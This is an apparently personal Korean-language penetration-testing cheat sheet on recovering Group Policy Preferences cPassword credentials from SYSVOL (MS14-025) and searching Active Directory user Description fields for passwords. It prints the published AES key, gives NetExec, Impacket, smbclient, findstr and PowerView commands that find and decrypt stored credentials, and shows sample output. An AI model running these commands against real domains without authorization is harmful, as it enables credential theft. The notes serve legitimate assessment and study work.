# 08_GPP_cPassword

# GPP / cPassword (MS14-025)

그룹 정책 기본 설정(Group Policy Preferences)으로 배포된 계정/비밀번호가 SYSVOL에 남는 취약점. SYSVOL은 모든 도메인 유저가 읽을 수 있어서, 저권한 계정 하나만 있으면 바로 체크 가능하다.

---

## 원리

GPP로 "이 컴퓨터들은 부팅하면 자동으로 이 계정/비밀번호로 로그인해라" 같은 설정(Autologon), 또는 로컬 그룹/드라이브 매핑 같은 작업을 걸 때, 그 비밀번호가 XML 파일(`Registry.xml`, `Groups.xml` 등)에 `cpassword` 속성으로 저장된다. AES-256으로 암호화되어 있지만, **그 고정 키가 2012년 MS 공식 문서에 그대로 공개되어 있었다** (MS14-025로 이후 GPP 자체는 막혔으나, 이미 배포된 오래된 파일은 여전히 SYSVOL에 남아있는 경우가 많다). 즉 파일만 찾으면 누구나 즉시 복호화 가능하다.

공개된 AES 키 (32바이트):

```
4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
```

---

## 자동 탐지

```bash
# nxc/CrackMapExec — Registry.xml(Autologon) 탐색
nxc smb <IP> -u <user> -p '<pass>' -M gpp_autologin

# nxc/CrackMapExec — Groups.xml(일반 GPP 계정/비밀번호) 탐색
nxc smb <IP> -u <user> -p '<pass>' -M gpp_password
```

### 성공 시 vs 실패 시 출력 비교

```
성공 시: 유저명 + 평문 비번이 바로 출력됨
  [+] Found Registry.xml, decrypted cpassword: <평문>, username: <계정명>

실패 시: 파일 자체를 못 찾고 spidering만 완료됨 (오늘 우리가 본 결과)
  [*] Started spidering
  [*] Done spidering (Completed in ...)
  → 이 도메인에는 GPP 경로로 배포한 이력이 없거나, 이미 삭제된 상태 → dead-end로 판단
```

---

## 수동/대안 방법

```bash
# Impacket 대안 도구
Get-GPPPassword.py <IP> -u <user> -p '<pass>'

# smbclient로 직접 SYSVOL 탐색 후 수동 다운로드
smbclient //<IP>/SYSVOL -U <user> -c 'recurse ON; ls'

# 위도우 호스트에서 직접 검색 (이미 접근 가능한 상태일 때)
findstr /S /I cpassword \\<도메인>\sysvol\<도메인>\policies\*.xml
```

---

## 수동 복호화 (도구 없을 때)

```bash
gpp-decrypt '<cpassword 값>'
```

---

## 팁

- `gpp_autologin`(Registry.xml)과 `gpp_password`(Groups.xml)는 다른 파일을 보므로 둘 다 시도할 것
- SYSVOL은 모든 도메인 유저가 READ 가능하므로, 지금 가진 아무 도메인 계정으로도 체크 가능
- 2014년 이후 만들어진 도메인은 이 경로가 없을 가능성이 높지만, 오래된 레거시 도메인(2014년 이전부터 운영된 환경)은 여전히 취약한 경우가 많다

---

## Description 필드 헌팅 (도메인 유저라면 누구나 조회 가능한 또 다른 퀵윈)

AD 계정의 Description(설명) 필드는 관리자가 계정 용도를 적어두는 자유 텍스트 필드다. 때때로 임시 비번이나 계정 정보를 실수로 적어두는 경우가 있다. 로그인 조회만한 일반 권한으로도 바로 확인 가능해 비용이 거의 들지 않는다.

```bash
nxc ldap <IP> -u <user> -p '<pass>' -M get-desc-users
# 또는 버전에 따라
nxc ldap <IP> -u <user> -p '<pass>' -M user-desc

# 키워드 커스텀마이징 (모듈이 지원하는 경우)
nxc ldap <IP> -u <user> -p '<pass>' -M user-desc -o ADD_KEYWORDS=ip,vpn,cred,secret,pw,pass

# PowerView 대안
Get-DomainUser * | select samaccountname,description | ?{$_.Description -ne $null}
```

### 성공 시 vs 실패 시 구버

```
실패(dead-end) 예시: 빌트인 계정(Administrator, Guest, krbtgt)의 기본 설명만 나오고 끝
  User: Administrator description: Built-in account for administering the computer/domain
  User: krbtgt description: Key Distribution Center Service Account
  -> 다른 커스텀 계정에 description이 없거나 비번 힌트가 없으면 dead-end

성공 예시: 커스텀 계정의 description에 비번/힌트가 그대로 들어있음
  User: tempuser description: temp account pw=Welcome2024!
```